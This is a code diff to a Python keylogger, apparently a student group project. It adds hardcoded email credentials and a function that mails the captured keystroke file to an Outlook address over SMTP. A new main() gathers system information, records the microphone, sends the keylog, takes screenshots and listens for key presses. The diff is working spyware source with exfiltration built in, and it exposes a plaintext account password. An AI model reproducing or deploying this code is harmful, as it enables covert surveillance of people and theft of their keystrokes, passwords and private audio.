@@ -37,9 +37,11 @@ microphone_time =10
 file_path_txt = file_path+extend+ keys_information
 file_path_sys = file_path+extend+sys_information
 file_path_audio = file_path+extend+audio_information
+email_addr = "is665group7@outlook.com"
+password = "Group7IS665!"
+to_email = "is665group7@outlook.com"
 
-
-# create a basic 
+ 
 # initialize variables
 count = 0 
 keys = []
@@ -71,7 +73,6 @@ def computer_information():
 		f.write("Version: " +platform.version()+"\n")
 		f.write("Machine: "+platform.machine()+"\n")
 		
-computer_information()
 
 def microphone():
 	#frequency
@@ -84,7 +85,6 @@ def microphone():
 
 	write(file_path_audio, fs, myrecording)
 
-microphone()
 
 def on_press(key):
     """Called when a key is pressed"""
@@ -99,6 +99,7 @@ def on_press(key):
         write_file(keys)
         keys = []
 
+
 def write_file(keys):
     """Write keys to a file"""
     with open(file_path + extend + keys_info, "a") as f:
@@ -111,10 +112,65 @@ def write_file(keys):
                 f.write(k)
                 f.close()
 
+
 def on_release(key):
     """Stop keylogger if Esc is released"""
     if key == Key.esc: # if esc is entered, exit keylogger
         return False
+
+
+def send_email(filename, attachment, to_email):
+    """Send email with attachment"""
+    from_email = email_addr
+
+    # create message
+    message = MIMEMultipart()
+
+    # message from, to, and subject
+    message["From"] = from_email
+    message["To"] = to_email
+    message["Subject"] = "IS 665 Group 7 - Keylogger File"
+
+    # create body of message
+    body = "Body_of_the_mail"
+
+    # attach body to message
+    message.attach(MIMEText(body, "plain"))
+
+    # open file to be sent
+    filename = filename
+    attachment = open(attachment, "rb") # read attachement
+
+    # create MIMEBase object
+    p = MIMEBase("application", "octet-stream")
+
+    # encode message
+    p.set_payload((attachment).read())
+
+    # encode into base64
+    encoders.encode_base64(p)
+    
+    # add header
+    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+
+    # attach file to message
+    message.attach(p)
+
+    # create SMTP session with port 587
+    s = smtplib.SMTP("smtp-mail.outlook.com", 587)
+
+    # start TLS for security
+    s.starttls()
+
+    # login to sender email account
+    s.login(from_email, password)
+
+    # convert message to str
+    text = message.as_string()
+
+    # send email
+    s.sendmail(from_email, to_email, text)
+    s.quit()
 
 
 def screenshot():
@@ -123,10 +179,15 @@ def screenshot():
     image.save(file_path + extend + "screenshot.png")
 
 
-if __name__ == "__main__":
+def main():
+    computer_information()
+    microphone()
+    send_email(keys_info, file_path + extend + keys_info, to_email)
     freeze_support()
     Process(target=screenshot).start()
+    with Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
 
-# Listener for keyboard events
-with Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join()
+
+if __name__ == "__main__":
+    main()
